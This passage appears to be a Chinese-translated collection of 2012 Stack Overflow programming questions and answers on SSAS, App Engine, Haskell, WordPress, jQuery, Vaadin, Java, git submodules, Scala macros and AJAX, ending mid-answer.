我知道在 SQL 中通常有某种类型的信息架构表，您可以搜索以查找特定的列或表。在 SSAS 中，有没有办法搜索所有属性（MDX？Visual Studio Data Tools？）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-21T17:04:22.640

感谢用户 rlobban 提供链接。正如 Benny Austin 在链接中显示的那样，您可以在 SSAS 中搜索属性：

```
 --All Attributes
SELECT [CATALOG_NAME] as [DATABASE],
CUBE_NAME AS [CUBE],[DIMENSION_UNIQUE_NAME] AS [DIMENSION],
HIERARCHY_DISPLAY_FOLDER AS [FOLDER],HIERARCHY_CAPTION AS [DIMENSION ATTRIBUTE],
HIERARCHY_IS_VISIBLE AS [VISIBLE]
 FROM $system.MDSchema_hierarchies
WHERE CUBE_NAME  ='Adventure Works'
AND HIERARCHY_ORIGIN=2
ORDER BY [DIMENSION_UNIQUE_NAME] 
```

事实证明，这对我来说是一个非常有用的查询，并且可以很容易地适应创建更精细的查询。

# google-app-engine - 如何让我的 App Engine Datastore 用户搜索更快？

> ID：12078344
> 
> 赞同：0
> 
> 时间：2012-08-22T17:26:32.063
> 
> 标签：google-app-engine, memcached, python-2.7, python-memcached

我需要能够更快地搜索我的用户。没有 memcache 的搜索需要 8 秒。[现在我的代码在Not Dot Net](http://blog.notdot.net/2009/9/Efficient-model-memcaching)的帮助下使用了 memcache，这将搜索时间减少到 4 秒。我现在的问题是，我怎样才能让它更快？

```
qUserSearch = Utilities.deserialize_entities(memcache.get("qUserSearch"))
if not qUserSearch:
    qUserSearch = db.GqlQuery("SELECT * FROM User ORDER BY created DESC").fetch(100000)
    memcache.add("qUserSearch", Utilities.serialize_entities(qUserSearch))

searchLength = len(searchData) 
hits = []
gotHits = False

for u in qUserSearch:
    searchEmail = u.email[0:searchLength]
    if searchEmail == searchData:
        hits.append( u.key() )
    else:
        # Since I only search for the first x chars
        # will there never be hits after it's had hits
        if gotHits:
            break 
return hits 
```

我的第一个想法：

*   仅转换为 ndb 和 SELECT，需要，来自用户的数据
*   SQL方式，创建数据较少的表。只是用户名和元数据密钥
*   新的全文搜索
*   3rd 方开发人员的旧可搜索模型
*   Memcache 只需要属性并遍历它而不是一切

还是你有其他想法？你认为哪一次我会节省最多的时间？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:16:17.360

您还可以使用两个不等式过滤器模拟您尝试完成的前缀搜索

```
db.GqlQuery("SELECT * FROM User WHERE email >= :1 AND email <= :2", searchData, unicode(searchData) + u"\ufffd") 
```

注意：此答案取自为问题提供的第二个答案[Google App Engine: Is it possible to do a Gql LIKE query?](https://stackoverflow.com/questions/47786/google-app-engine-is-it-possible-to-do-a-gql-like-query) .

# haskell - 另一种类型的故障

> ID：12078346
> 
> 赞同：5
> 
> 时间：2012-08-22T17:26:37.410
> 
> 标签：haskell

试图了解如何推断出最终签名：

```
GHCi> :t (+)
(+) :: Num a => a -> a -> a
GHCi> :t (<*>)
(<*>) :: Applicative f => f (a -> b) -> f a -> f b
GHCi> :t (<*>) (+)
(<*>) (+) :: Num b => (b -> b) -> b -> b 
```

`(a' -> a' -> a')`必须与 统一`f (a -> b)`，所以`f`可能是类型`((->) r)`：

```
(<*>) :: Applicative ((->) r) => r -> (a -> b) -> (r -> a) -> (r -> b)
(<*>) (+) ~ a' -> (a' -> a') -> (a' -> a') -> (a' -> a')
(<*>) (+) :: (a' -> a') -> (a' -> a') -- ^^^ got stuck here 
```

谁能解释如何获得最终类型？

谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-22T17:41:08.057

您遇到的问题是`->`. 考虑以下类型`<*>`：

```
<*> :: (Applicative f) => f (a -> b) -> f a -> f b 
```

`f a`等于`r -> a`，我们有

```
<*> :: f (a -> b) -> f a -> f b
    :: (r -> (a -> b)) -> (r -> a) -> (r -> b)
    :: (r -> a -> b) -> (r -> a) -> (r -> b) -- This is the key line 
```

请注意，它从`(r -> (a -> b)) -> other stuff`到`(r -> a -> b) -> other stuff`，而不是`r -> (a -> b) -> other stuff`。我们可以删除内括号，因为它们在箭头的右侧，但我们不能删除外括号，因为它们在箭头的左侧。

现在，`(+) :: (Num a) => a -> a -> a`. 这完全符合第一个参数`<*>`when `r`is same as `a`is same as`b`并且它们都是数字。总之，我们明白了

```
(<*>) (+) :: (Num a) => (a -> a) -> (a -> a)
          :: (Num a) => (a -> a) -> a -> a 
```

再次注意，我删除了右侧的括号，而不是箭头左侧的括号。

# wordpress - wordpress //bloginfo\\ 函数不会在部分页面上回显输出

> ID：12078348
> 
> 赞同：1
> 
> 时间：2012-08-22T17:26:44.593
> 
> 标签：wordpress

`php bloginfo`我在使用 wordpress 之前从未遇到过一些问题……不知道该怎么做。

通常我用`<?php bloginfo('template_directory'); ?>/rest of link 4 img here`

但由于某种原因，现在它不起作用。当我查看源代码时，它并没有像它应该的那样回显链接，它只是作为`"src="/images/pic name here"`

我试过使用`get_bloginfo('stylesheet_directory');`等

我什至在 SO 上看到了一些帖子，试图以某种方式将 get_bloginfo 与这样的链接连接起来

再一次，奇怪的是我以同样的方式定义我的外部资产。例如像这样

```
<link rel="stylesheet" href="<?php bloginfo('template_directory'); ?>/scripts_n_css/css/default.css" type="text/css" media="screen" /> 
```

关于发生了什么的任何想法？先谢谢了。

编辑*** 因此，如果您查看我正在处理的这个网站，[http:](http://www.islandlivingpatio.com/?page_id=48) //www.islandlivingpatio.com/? page_id=48 图像不会加载。当我用 FireBug 检查时，它说“无法加载给定的 url”，但它在我的本地主机上工作。

这就是网站图像和它的 url 的样子。

```
<a href="<?php echo bloginfo('url');?>/?page_id=775"><img src="<?php bloginfo("template_directory");?>/images/Lynx.gif" alt="castandtubular"/></a> 
```

再一次，他们确实在我的本地机器上工作。当您单击该图像 alt 标记时（因为它是唯一出现的东西），那么下一页也无法加载图像。

关于发生了什么的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:42:09.780

尝试`get_bloginfo('template_directory')`像这样使用：

```
<img src="<?php get_bloginfo('template_directory'); ?>/images/your-img-here.jpg" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T22:14:46.900

当您使用 get_bloginfo() 时，您必须像这样实际回显输出：

```
<?php echo get_bloginfo('stylesheet_directory'); ?> 
```

注意“get_bloginfo()”之前的“echo”。

# javascript - Javascript从类中获取日期并添加图像

> ID：12078350
> 
> 赞同：0
> 
> 时间：2012-08-22T17:27:07.267
> 
> 标签：javascript, jquery

基本上，我想要一种方法让 Javascript 通过我的 HTML 查找特定类的隐藏日期，解析日期并检查它是否大于今天的日期。如果是这样，则将图像添加到父元素。看起来它可以工作，但这是编写代码的最佳方式吗？

```
$(".myClass").each(function() {
    var u = Date.parse($(this).text());
    var v = [u.valueOf()];
    var t = new Date();
    var d = Date.parse(t)

    if (v[0]>d)
    {
        $($(this).parent()).append("<img src='css/img/new.png' alt='icon' title='New Document' class='documentIconText' />");
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:40:25.780

您可以缓存图像。所有变量`each`似乎都没有必要。这是编写代码的另一种方法：

```
var imgnew = $('<image/>')
             .attr({src: 'css/img/new.png', alt:'icon',
                    title: 'New Document', class: 'documentIconText'});

$(".myClass").each(function() {
  if ((Date.parse($(this).text()) || new Date()).getTime() > new Date) {
    $($(this).parent()).append(imgnew);
  }
}); 
```

**注意**：`(Date.parse($(this).text()) || new Date()).getTime()`确保总有一个值可以比较

# java - Tomcat 上的 Vaadin Web 应用程序只为所有用户创建一个 webapp 实例

> ID：12078353
> 
> 赞同：0
> 
> 时间：2012-08-22T17:27:12.783
> 
> 标签：java, vaadin

我的英语有些问题，所以我为错误道歉。

我是Java编程的初学者。我使用 IntelliJIdea 作为 IDE，使用 Vaadin 框架创建 GUI，使用 tomcat 作为 Web 服务器。项目是用 maven 生成的。要创建应用程序，我使用以下源作为示例：

[从堆栈溢出](https://stackoverflow.com/questions/5550399/vaadin-web-xml-setup)

[视频教程](http://www.youtube.com/watch?v=qFlPAIAljDI)

有 Application 类，（它不是`com.vaadin.Application`继承者），而是单例。

```
package com.exadel.dinnerorders.vaadinwindow.application;
import com.exadel.dinnerorders.entity.Order;
import com.exadel.dinnerorders.entity.User;
import com.exadel.dinnerorders.service.TasksManagerService;
import com.google.common.eventbus.EventBus;

public class Application {
    private EventBus eventBus = new EventBus();
    private static Application INSTANCE = new Application();
    private User user;
    private Order order;
    private TasksManagerService tasksManagerService = new TasksManagerService();

    private Application() {
        tasksManagerService.start();
    }

    public synchronized static Application getInstance(){
        return INSTANCE;
    }

    public EventBus getEventBus() {
        return eventBus;
    }

    public void setUser(User user) {
        this.user = user;
    }

    public User getUser() {
        return user;
    }

    public Order getOrder() {
        return order;
    }

    public void setOrder(Order order) {
        this.order = order;
    }

    public TasksManagerService getTasksManagerService() {
        return tasksManagerService;
    }
} 
```

还有`WebApplicationController`类，它扩展了`com.vaadin.Application`.

```
package com.exadel.dinnerorders.vaadinwindow.application;

import com.google.common.eventbus.EventBus;
import com.google.common.eventbus.Subscribe;
import com.vaadin.terminal.Sizeable;
import com.vaadin.ui.*;

import java.util.Collection;

public class WebApplicationController extends com.vaadin.Application {
    private EventBus eventBus = Application.getInstance().getEventBus();
    private Layout loginLayout;
    private String datePattern = "YYYY-MM-DD";

    @Override
    public void init() {
        createLayouts();
        createMainWindow();
        eventBus.register(this);
        setTheme("apptheme");
    }
    //some another methods for initialization main window and layouts
} 
```

所以，看来我的应用程序运行良好。但我遇到了下一个问题：我在 Tomcat 7 配置的想法中运行应用程序。它启动没有任何问题。我将 Opera 作为浏览器打开并以 user1 等身份登录。一切似乎都正常。然后我打开 Google Chrome 或其他浏览器并以 user2 身份登录。如果在 Opera 中刷新窗口，它将显示知道 user2 已登录，但不是 user1。我曾尝试在不同的计算机上做同样的事情，我得到了相同的结果。（在一台机器上登录为 user1，在另一台机器上登录为 user2）。Firebug 显示 sessionID 在不同的浏览器中是不同的。

似乎问题出在我配置 servlet 的 web.xml 文件中。但是我尝试了不同的配置示例，并且总是得到相同的结果。

不幸的是，我没有设法在谷歌或其他论坛中找到答案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T19:04:01.073

我会说您的问题与静态应用程序单例有关。静态数据在 JVM 内的所有用户之间共享。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-23T08:03:01.207

正如 Henri 指出的那样，您在这里使用的是静态应用程序单例。`Application#getInstance()`这意味着对（以及，通过扩展， ）的每次调用都`WebApplicationController#getInstance`将返回相同的应用程序实例，而不管调用来自哪个 HTTP 会话。

如果您需要从 Web 应用程序的其他部分轻松访问 Application 实例，最常见的方法是使用`ThreadLocal<Application>`变量来存储实例。通过使用 a`HttpServletRequestListener`您可以在请求开始时设置该值，并在请求结束时将其清除。

有关示例代码，请参阅 Vaadin 网站上的[ThreadLocal Pattern](https://vaadin.com/wiki/-/wiki/Main/ThreadLocal%20Pattern "线程局部模式")文章中的第二个代码示例。

还有其他方法 - 使用 Spring 或 Guice 来创建和管理应用程序实例，但它们只有在您已经在使用这些框架时才有意义。

还值得注意的是，您可以通过调用`Window#getApplication`;来访问 Window 所属的 Application 实例。但是，仅当将 Window 添加到应用程序时才会建立此关联，因此在构造函数中不可用。

# java - 模板方法需要在子构造函数中声明一个对象

> ID：12078355
> 
> 赞同：0
> 
> 时间：2012-08-22T17:27:28.797
> 
> 标签：java, inheritance, template-method-pattern

一个扩展母类的子类，它在其构造函数中调用子类中实例化的模板方法，因为它需要在子构造函数中获得一个值。

我怎么能做这样的事情，而不改变我的父构造函数（Foo，在这里。我不能在真正的 Foo 类中做任何改变）：

```
public abstract class Foo{
    public Foo(){
        register();
    }

    public abstract void register();

    public void aMethod(int aValue){
        // body
    }

}

public class Bar extends Foo{

    public Foo(int aValue){
        // body
    }

    register(){
        aMethod(aValue);
    }
} 
```

在这里，即使我将 aValue 放在一个字段中，aValue 也不会在

```
aMethod(aValue);. 
```

我该如何解决我的问题？

我正在寻找任何模式，ULM，解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:33:49.717

> 一个扩展母类的子类，它在其构造函数中调用子类中实例化的模板方法，因为它需要在子构造函数中获得一个值。

为什么子类构造函数不简单地将值传递给超类构造函数？

```
public abstract class Foo {
    protected Foo(int value) {
       ... use value ...
   }
}

public class Bar extends Foo {
    public Foo(int value) {
        super(value);
    }
    ...
} 
```

请注意，在构造函数中调用虚方法是一种危险的做法，因为子类还没有机会初始化自己。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:42:57.440

你的班级结构很混乱。您在遗留代码中是否有无法更改 parent 的内容？如果不改变它:-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:51:57.433

在构造函数中调用抽象方法是一个糟糕的设计。某些工具（如 PMD）默认将其指示为警告（甚至可能是错误）。所以我认为很难在这里谈论任何模式。我要做的是如下实现 Bar 类。

```
public class Bar extends Foo{

    private int aValue;
    private boolean initialized = false;

    public Bar(int aValue){
        this.aValue = aValue;
        initialized = true;
        register();
    }

    public void register(){
       if (initialized)
       aMethod(aValue);
    }

} 
```

# javascript - setTimeout 没有第一次执行

> ID：12078357
> 
> 赞同：0
> 
> 时间：2012-08-22T17:27:36.020
> 
> 标签：javascript

我正在尝试使用 setTimeout。我希望它每五秒执行一次，但不是在调用 setTimeout 时立即执行。我无法让它工作：

```
firsttime = true;
window.setTimeout(function () {
    if (!firsttime) {
        window.location.reload();
    }
    firsttime = false;
}, 5 * 1000); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T17:31:51.970

一旦你`window.location.reload()`的页面，所有的 JavaScript 变量和计时器都会丢失。当页面第二次加载时，你`firsttime`又来`true`了。

所以你要做的是：当用户第一次进入页面时，10秒后刷新。然后每 5 秒刷新一次。问题是：HTTP是无状态的，用户每次进入页面*都是*第一次。两者之间没有记忆或状态。

你可以做的是：

*   使用 cookie 或 HTTP 会话来记住该用户已经进入该页面。第一次使用`setTimeout()`需要 10 秒。在该页面上的每个后续条目上，您使用 5 秒（`setInterval()`在这里毫无价值）

*   进入后`first.html`等待 10 秒并重定向到`second.html`. 相同，但硬编码 5 秒延迟。查询参数或哈希标签也可以用来保持状态。不过有点hacky。

*   不时刷新整个页面是如此 2000-ish。考虑[ajax](/questions/tagged/ajax "显示标记为“ajax”的问题")和部分 DOM 更新。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T17:30:28.757

`setTimeout`只运行一次。

`setInterval`每 X 毫秒运行一次。

```
firsttime = true;
window.setInterval(function () {
    if (!firsttime) {
        window.location.reload();
    }
    firsttime = false;
}, 5 * 1000); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T17:30:14.083

您正在寻找 setInterval。它采用相同的参数，但每 X 秒执行一次回调，而不是一次。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-22T17:34:23.713

`setTimeout`只运行一次，此时条件`(!firsttime)`不成立（原样`firsttime`，`true`所以什么也没有发生。

您可以留下这张支票。该功能**不会**立即加载。第一次执行将在指定的延迟之后。

如果您正在寻找重复执行，请检查`setInterval`. 但是你应该意识到`window.location.reload();`重新加载整个页面，包括其中的 JavaScript，所以它只能执行一次（然后重新加载页面，清除间隔并重新初始化 JS，并使用另一个超时实例）。

在您的情况下，也许 HTML 刷新会更有用：

```
<meta http-equiv="refresh" content="5;url=yourwebpage"> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-22T17:31:13.290

```
if (!firsttime) {
        window.location.reload();
    }
    firsttime = false; 
```

这只会执行一次，因为您在 5 秒内调用超时：

```
window.setTimeout(function () {
}, 5 * 1000); 
```

当您希望它每 5 秒执行一次时；使用 setInterval：

```
firsttime = true;
window.setInterval(function () {
    if (!firsttime) {
        window.location.reload();
    }
    firsttime = false;
}, 5 * 1000); 
```

但是之后; setTimeout 10 秒就足够了：

```
window.setTimeout(function () {
    window.location.reload();
}, 10 * 1000); 
```

因为当页面重新加载时变量 firsttime 将重置为 true

# jquery - 是否有任何 jQuery 插件或库用于将 HTML 构建为可打印页面？

> ID：12078358
> 
> 赞同：1
> 
> 时间：2012-08-22T17:27:41.077
> 
> 标签：jquery, pdf, css, printing, media-queries

感谢您的关注！

## 背景

我正在开发一个使用（优秀的）[Rotativa](https://github.com/webgio/Rotativa)库的项目，该库接受 HTML 页面，然后将其作为页面（或页面）打印到 PDF。

Rotativa 在 ASP.NET MVC3+ 上运行，我想标准是使用 Rotativa 抓取并放入 PDF 的 Razor 视图来呈现您的动态页面。

## 问题

我发现 Razor 对于这项工作有点笨拙，并且在使用 jQuery 接受（JSON）数据并将该数据转换为结构化和样式化的页面元素方面要快得多。由于 Rotativa 允许我在页面转换为 PDF 之前在页面上运行 JavaScript，因此我想使用 jQuery 而不是 Razor。在任何一种情况下，我都需要一种方法来正确测量放置元素的大小，以便在 8.5" X 11" 页面上，我可以正确放置页眉、页脚、分页符、页码等。

## 问题

我在想我只需要为此推出我自己的插件，但是在做这项工作之前，是否已经有一个用于 jQuery 的库或插件可以做到这一点？我（在谷歌上）搜索了这样一个插件，但运气不佳。

再次感谢。

# c# - 当存在插件架构时，确保对 API 返回值的只读访问

> ID：12078362
> 
> 赞同：2
> 
> 时间：2012-08-22T17:28:07.487
> 
> 标签：c#, oop, class-design

我有一种情况，我向我的类库公开了一个插件架构，我希望其他人能够实现我创建的接口并让他们的自定义实现被类使用。

我正在使用依赖注入（特别是构造函数注入）来实现这一点。

这很好用，除了我试图设计具有两个冲突目标的应用程序：

*   API 的使用者不能修改返回值；我创建了自定义只读集合和对象，`internal`在设置器上使用等以确保没有消费者可以修改它
*   其他程序集中的插件*应该*能够访问这些内部方法和属性

这两个目标是相互冲突的，因为我的 API（或 C#）无法授予对插件程序集的`internal`访问权限（通过`InternalsVisibleTo`或类似方式），但*不能*授予一般消费者。

* * *

**说明性示例**

假设我们有三个程序集。我的类 ( `Class`)、插件程序集 ( `Plugin`) 和消费者程序集 ( `Consumer`)。

接口，`IReturnValue`指定 API 的返回值（`Class`程序集中的某些方法或类）。问题是这样的：我希望能够在 的任何给定实例上`Plugin`设置只读 ( ) 属性和索引器，但我不希望代码能够做到这一点。`internal``IReturnValue``Consumer`

由于正在使用插件系统，因此我无法提前知道要授予哪些程序集`InternalsVisibleTo`。

* * *

在这种情况下，**我真的应该关心消费者修改返回类型吗？**如果他们这样做，似乎是他们自己的错。而且我想不出任何体面的解决方案来解决这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:32:36.360

正如我在评论中已经说过的，我不确定我是否正确理解了你的问题。

我这样理解你的问题：

您有一个由消费者和实施者使用的 A 类。消费者应该只能*获取*数据，实现者还应该能够*设置*数据。

在这种情况下，我将创建一个根据消费者需求建模的接口，该接口仅具有读取访问权限，而另一个接口具有实现者的读/写访问权限。

问题更新后更新：
消费者的只读接口已经存在：`IReturnValue`并且应该用于此目的。

您现在需要做的就是创建一个只写或读/写的接口，具体取决于 API 的需要。

# python - 在单独的线程中等待用户输入

> ID：12078363
> 
> 赞同：6
> 
> 时间：2012-08-22T17:28:09.880
> 
> 标签：python, multithreading, user-input

我正在尝试完成一种方法来产生一个等待用户输入的线程；如果在 10 秒内没有输入任何输入，我希望脚本终止生成的线程并继续处理。如果输入了文本，我有办法从线程中取回输入，但我无法让超时杀死新生成的线程。

在下面的例子中是我最接近的。我告诉新创建的线程它是一个守护进程，它会在主脚本退出时退出。我遇到的问题是线程将继续等待，直到脚本退出或用户输入了某些内容。

```
shared_var = ['1']
def run(ref):
    ref[0] = raw_input("enter something: ")
    print "shared var changed to '%s'" % (ref[0])

thread = threading.Thread(target=run, args=(shared_var,))
thread.daemon = True  
thread.start()
time.sleep(10)  # simplified timeout

#Need some way to stop thread if no input has been entered
print "shared var = " + shared_var[0] 
```

我知道突然杀死一个线程不是最好的方法（[相关链接](https://stackoverflow.com/questions/323972/is-there-any-way-to-kill-a-thread-in-python)），但我不知道如何中断等待 raw_input 的新线程

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-24T16:36:51.880

看起来没有办法计时用户输入。在 SmartElectron 提供的链接中，该解决方案不起作用，因为一旦请求 raw_input，计时器就会停止。

迄今为止最好的解决方案是：

```
# Declare a mutable object so that it can be pass via reference
user_input = [None]

# spawn a new thread to wait for input 
def get_user_input(user_input_ref):
    user_input_ref[0] = raw_input("Give me some Information: ")

mythread = threading.Thread(target=get_user_input, args=(user_input,))
mythread.daemon = True
mythread.start()

for increment in range(1, 10):
    time.sleep(1)
    if user_input[0] is not None:
        break 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:33:42.777

在你的情况下，不要担心突然关闭线程。在链接中，说

在 python 和任何语言中，突然终止线程通常是一种不好的模式。考虑以下情况：

> *   线程持有必须正确关闭的关键资源。
> *   该线程创建了几个其他线程，这些线程也必须被杀死。
> 
> 关闭数据库连接、打开的文件等需要正确关闭的资源，在这种情况下正确关闭线程是基础。在这种情况下，您的解决方案是有效的。*

如果此解决方案不满足您可以使用[How to set time limit on input](https://stackoverflow.com/questions/2933399/how-to-set-time-limit-on-input?)

# git - git submodule 究竟是如何工作的

> ID：12078365
> 
> 赞同：26
> 
> 时间：2012-08-22T17:28:22.370
> 
> 标签：git, git-submodules

该`.gitmodule`文件仅指定模块存储库 url。怎么`git submodule`知道要下载哪个版本？它似乎总是在检查最新版本。那么，开发者如何保证主项目与子模块的兼容性呢？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-08-22T17:58:56.093

Your submodule is represented as a special entry with a special mode (called a **[gitlink](http://www.kernel.org/pub/software/scm/git/docs/git-fast-import.html#_tt_filemodify_tt)**, see "[Nested git repositories without submodules?](https://stackoverflow.com/questions/5980960/git-repository-in-a-git-repository/5981099#5981099)"):
(See "[Checkout past git submodule commit](https://stackoverflow.com/questions/2297899/checkout-past-git-submodule-commit/2300638#2300638)")

```
new file mode 160000
index 0000000..4c4c5a2 
```

So it isn't checking out the "LATEST" version, but always a specific SHA1, and it does so in a [DETACHED `HEAD` mode](https://stackoverflow.com/questions/3965676/why-did-git-detach-my-head/3965714#3965714) (see "[How to make submodule with detached `HEAD` to be attached to actual `HEAD`?](https://stackoverflow.com/questions/8642668/how-to-make-submodule-with-detached-head-to-be-attached-to-actual-head/8644339#8644339)".

That doesn't mean you can't update a submodule, as I explain in "[true nature of submodules](https://stackoverflow.com/questions/1979167/git-submodule-update/1979194#1979194)".

For more on submodules, and on potentially why you might *not* want to use them(!), read the sobering article "[Why your company shouldn’t use Git submodules](http://codingkilledthecat.wordpress.com/2012/04/28/why-your-company-shouldnt-use-git-submodules/)", from [Amber Yust](https://plus.google.com/116797686750161798768/posts) (also [on SO](https://stackoverflow.com/users/148870/amber)).

Just one small extract, for kicks and giggles (emphasis mine):

> When you invoke `git submodule update` it looks in the parent repository for a SHA for each submodule, goes into those submodules, and checks out the corresponding SHAs.
> As would be the case if you checked out a SHA in a regular repository, this puts the submodule into a detached HEAD state.
> 
> If you then make changes in the submodule and commit then, Git will happily create the commit… and leave you still with a detached HEAD. See where this is going yet?
> 
> Say you merge in some more changes which happen to include another submodule update. If you haven’t committed your own submodule change into the parent project yet, Git won’t consider your new commit in the submodule as a conflict, and **if you run `git submodule update` it will happily wipe out your commit without warning, replacing it with that from the branch you just merged in**.
> 
> I hope you had your submodule’s `reflog` enabled or still have the old commit in your terminal scrollback, **because otherwise, you just lost all that work you did**.

Err... "ouch".

* * *

Note that now a submodule can track the latest from a branch: see "[git submodule tracking latest](https://stackoverflow.com/a/9189815/6309)".

# scala - 我可以获得从 Scala 中的密封父级派生的所有案例对象的编译时列表吗？

> ID：12078366
> 
> 赞同：39
> 
> 时间：2012-08-22T17:28:26.683
> 
> 标签：scala

正如在 SO 上多次讨论的那样，如果您没有详尽列出从密封类派生的所有类型，Scala 匹配会警告您。

我想要的是从特定父级派生的案例对象的编译时生成的 Iterable。或者，我会很高兴有一种方法可以让编译器告诉我在某些 Iterable 中没有所有必要的类型。我不想要运行时、基于反射的方法。

作为第二种方法的一个例子，我想让下面的粗略代码在指示的地方生成一个编译错误。

```
sealed trait Parent
case object A extends Parent
case object B extends Parent
case object C extends Parent

// I want a compiler error here because C is not included in the Seq()
val m = Seq(A, B).map(somethingUseful) 
```

告诉我这是不可能的，请随时回答。似乎在某种程度上应该是可能的，因为当确定匹配不是详尽无遗时，编译器必须做基本相同的工作。

换一种方式考虑，我会采用类似于 Enumeration.values() 方法的方法，除了应用于案例对象。当然，我可以通过手动维护的值列表向父对象的伴随对象添加类似于上述代码的内容，但是当编译器可以为我执行此操作时，这似乎很容易出错。

```
// Manually maintained list of values
object Parent { 
    val values = Seq(A, B, C)
} 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-08-22T20:39:57.987

更新。从 2.10.0-M7 开始，我们将此答案中提到的方法作为公共 API 的一部分公开。`isSealed`是`ClassSymbol.isSealed`和`sealedDescendants`是`ClassSymbol.knownDirectSubclasses`。

这不会是您问题的答案。

*但是*，如果您愿意满足于类似的东西`Enumeration.values()`，*并且*您正在使用最近的里程碑 2.10，*并且*您愿意处理一些丑陋的铸造到内部 API 业务，您可以编写以下内容：

```
import scala.reflect.runtime.universe._

def sealedDescendants[Root: TypeTag]: Option[Set[Symbol]] = {
  val symbol = typeOf[Root].typeSymbol
  val internal = symbol.asInstanceOf[scala.reflect.internal.Symbols#Symbol]
  if (internal.isSealed)
    Some(internal.sealedDescendants.map(_.asInstanceOf[Symbol]) - symbol)
  else None
} 
```

现在，如果您有这样的层次结构：

```
object Test {
  sealed trait Parent
  case object A extends Parent
  case object B extends Parent
  case object C extends Parent
} 
```

您可以获得密封类型层次结构成员的类型符号，如下所示：

```
scala> sealedDescendants[Test.Parent] getOrElse Set.empty
res1: Set[reflect.runtime.universe.Symbol] = Set(object A, object B, object C) 
```

这很可怕，但我认为如果不编写编译器插件，你不会得到你真正想要的东西。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-08-27T01:07:08.987

这是一个在 2.10.0-M6 上使用宏的工作示例：

（更新：为了让这个例子在 2.10.0-M7 中工作，你需要将 c.TypeTag 替换为 c.AbsTypeTag；为了让这个例子在 2.10.0-RC1 中工作，c.AbsTypeTag 需要替换为 c.WeakTypeTag )

```
import scala.reflect.makro.Context

object SealednessMacros {
  def exhaustive[P](ps: Seq[P]): Seq[P] = macro exhaustive_impl[P]

  def exhaustive_impl[P: c.TypeTag](c: Context)(ps: c.Expr[Seq[P]]) = {
    import c.universe._

    val symbol = typeOf[P].typeSymbol

    val seen = ps.tree match {
      case Apply(_, xs) => xs.map {
        case Select(_, name) => symbol.owner.typeSignature.member(name)
        case _ => throw new Exception("Can't check this expression!")
      }
      case _ => throw new Exception("Can't check this expression!")
    }

    val internal = symbol.asInstanceOf[scala.reflect.internal.Symbols#Symbol]    
    if (!internal.isSealed) throw new Exception("This isn't a sealed type.")

    val descendants = internal.sealedDescendants.map(_.asInstanceOf[Symbol])

    val objs = (descendants - symbol).map(
      s => s.owner.typeSignature.member(s.name.toTermName)
    )

    if (seen.toSet == objs) ps else throw new Exception("Not exhaustive!")
  }
} 
```

这显然不是很健壮（例如，它假设您在层次结构中只有对象，并且它将失败`A :: B :: C :: Nil`），它仍然需要一些令人不快的转换，但它可以作为一个快速的概念验证。

首先我们在启用宏的情况下编译这个文件：

`scalac -language:experimental.macros SealednessMacros.scala`

现在，如果我们尝试编译这样的文件：

```
object MyADT {
  sealed trait Parent
  case object A extends Parent
  case object B extends Parent
  case object C extends Parent
}

object Test extends App {
  import MyADT._
  import SealednessMacros._

  exhaustive[Parent](Seq(A, B, C))
  exhaustive[Parent](Seq(C, A, B))
  exhaustive[Parent](Seq(A, B))
} 
```

我们会`Seq`在缺少的情况下得到一个编译时错误`C`：

```
Test.scala:14: error: exception during macro expansion: 
java.lang.Exception: Not exhaustive!
        at SealednessMacros$.exhaustive_impl(SealednessMacros.scala:29)

  exhaustive[Parent](Seq(A, B))
                    ^
one error found 
```

请注意，我们需要使用指示父级的显式类型参数来帮助编译器。

# c# - 需要动态更新表值的建议（C#、MVC3、JavaScript）

> ID：12078369
> 
> 赞同：0
> 
> 时间：2012-08-22T17:28:35.590
> 
> 标签：c#, javascript, asp.net-mvc, dynamic-data

我有带有表格的 html 页面。简化它可以看：

```
<Row_ID>, <bla-bla-bla>, <_XXX.XX%_ is complete> 
```

在 C# 中，我有一个通过 ID 评估“% is complete”的函数。但它的操作可能需要一些时间（不是即时的，可能会导致一些延迟）

现在我需要实现“% is complete”的自动刷新，它将在一两分钟的间隔内更新数据。我不想重新加载整个页面或整个表格（如果我通过 ajax 来完成）。因为用户可能会查看页面并且重新加载会阻止其当前位置（甚至表中的行数）。

所以我考虑调用一些函数并从服务器获取值（通过JSON？）的javascript setTimeout 但我不确定当javascript函数请求数据时网页冻结。可能存在另一种更新方法吗？

欢迎任何版本或建议！

对不起我的英语不好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:18:10.997

这应该实现你的意思。我假设您将进行一次调用以返回多个结果的 JSON 结果（最有效）。此外，jQuery [ajax](http://api.jquery.com/jQuery.ajax/)调用是异步的，所以不会有页面“冻结”——同样，只是猜测你的 MVC 模型设置，但我想你明白了吗？

```
<table>
    @foreach(var line in Model)
    {
    <tr>
        <td>@line.Id</td>
        <td>@line.Something</td>
        <td id="p-@line.Id">@line.Percentage% complete</td>                   
    </tr>
    }
</table> 
```

JS：

```
var to;
$().ready(function() {
    ResetUpdate();
});

function Update() {
    // do your $.ajax();
    // if success,
    // assuming return data is an array like:
